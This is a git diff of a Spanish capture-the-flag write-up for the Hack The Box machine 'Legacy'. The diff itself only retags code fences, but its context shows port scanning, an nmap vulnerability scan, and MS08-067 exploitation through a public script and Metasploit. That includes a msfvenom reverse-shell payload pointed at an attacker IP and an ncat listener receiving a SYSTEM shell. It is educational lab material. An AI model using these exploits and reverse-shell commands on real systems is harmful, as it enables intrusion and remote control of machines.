@@ -26,7 +26,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar dos `nmap` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.4
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-08 13:16 CST
 Initiating Ping Scan at 13:16
@@ -82,7 +82,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2009.57 seconds
 
 Como en otras ocasiones, verificamos los puertos abiertos con `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.4
 
 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-10-06 03:15:47 GMT
@@ -104,7 +104,7 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
 
-```text
+``` text
 root@laptop:~# nmap -sV -sC -p139,445,U:137 -v -n 10.10.10.4
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-05 22:58 CDT
 NSE: Loaded 151 scripts for scanning.
@@ -189,7 +189,7 @@ Los scripts de enumeración iniciales sobre el puerto de netbios y de smb nos de
 
 Ejecutamos ntbscan en modo _verbose_ para obtener una salida mas detallada:
 
-```text
+``` text
 (impacket-a2aNp99x) xbytemx@laptop:~/git/impacket$ nbtscan -v 10.10.10.4
 Doing NBT name scan for addresses from 10.10.10.4
 
@@ -215,7 +215,7 @@ Verificamos que esta información fue la misma entregada por el script de nmap, 
 
 Ahora, en lugar de usar smbclient o smbclient.py, iniciare con un script de nmap que me ayude a hacer un descubrimiento de la versión de smb:
 
-```
+``` text
 root@laptop:~# nmap -pT:445,U:137,T:139 -sU -sS -n -v -Pn --script smb-protocols.nse -sV -sC 10.10.10.4
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 07:53 CST
 NSE: Loaded 46 scripts for scanning.
@@ -270,7 +270,7 @@ Bien, ahora que tenemos identificado que se trata de un Windows XP, que usa SMBv
 
 > Algo muy interesante que encontré, fue que cuando explore la carpeta scripts en busca de herramientas para la enumeración, me encontré con herramientas para la detección de vulnerabilidades. Fue por esto que opte por ejecutar la categoría sobre los puertos.
 
-```
+``` text
 root@laptop:~# nmap -pT:445,U:137,T:139 -sU -sS -n -v -Pn --script vuln -sV -sC 10.10.10.4
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 08:07 CST
 NSE: Loaded 149 scripts for scanning.
@@ -361,7 +361,7 @@ Hay varios caminos podemos usar para explotar esta vulnerabilidad, la más fáci
 
 Para explotar esta vulnerabilidad con este script, primero necesitamos clonar el [repositorio](https://github.com/andyacer/ms08_067), después cumplir con las dependencias y finalmente preparar el entorno.
 
-```
+``` text
 xbytemx@laptop:~/git$ git clone https://github.com/andyacer/ms08_067
 Clonando en 'ms08_067'...
 remote: Enumerating objects: 37, done.
@@ -376,7 +376,7 @@ xbytemx@laptop:~/git/ms08_067$ python ms08_067_2018.py
 
 Ahora que tenemos todo lo que necesitamos, debemos preparar la shellcode con msfvenom:
 
-```
+``` text
 xbytemx@laptop:~/git/ms08_067$ msfvenom --payload windows/shell_reverse_tcp --nopsled 7 LHOST=10.10.14.26 LPORT=3001 EXITFUNC=thread --bad-chars "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -e x86/jmp_call_additive -a x86 --platform windows
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/jmp_call_additive
@@ -425,7 +425,7 @@ Usar una reverse shell es menos ruidosa que subir todo meterpreter y levantar al
 
 Sustituimos la salida en el script de python, levantamos un ncat y lanzamos el script:
 
-```
+``` text
 xbytemx@laptop:~/git/ms08_067$ python2 ms08_067_2018.py 10.10.10.4 7 445
 #######################################################################
 #   MS08-067 Exploit
@@ -449,7 +449,7 @@ Exploit finish
 
 En la remota:
 
-```
+``` text
 xbytemx@laptop:~$ ncat -vnlp 3001
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -509,7 +509,7 @@ C:\WINDOWS\system32>
 ## Metasploit
 Iniciamos metasploit y seleccionamos **exploit(/windows/smb/ms08_067_netapi**. Inicializamos las variables con sus valores correspondientes y ejecutamos "exploit":
 
-```
+``` text
 msf5 > search ms08-067
 
 Matching Modules
@@ -564,7 +564,7 @@ meterpreter >
 
 Así de rápido y sencillo, tenemos un meterpreter ejecutándose del lado remoto hacia nuestra maquina.
 
-```
+``` text
 meterpreter > sysinfo
 Computer        : LEGACY
 OS              : Windows XP (5.1 Build 2600, Service Pack 3).
@@ -581,13 +581,13 @@ Server username: NT AUTHORITY\SYSTEM
 
 # user.txt
 
-```
+``` text
 meterpreter > type C:\Documents and Settings\john\Desktop\user.txt
 ```
 
 # root.txt
 
-```
+``` text
 meterpreter > type C:\Documents and Settings\Administrator\Desktop\root.txt
 ```
 
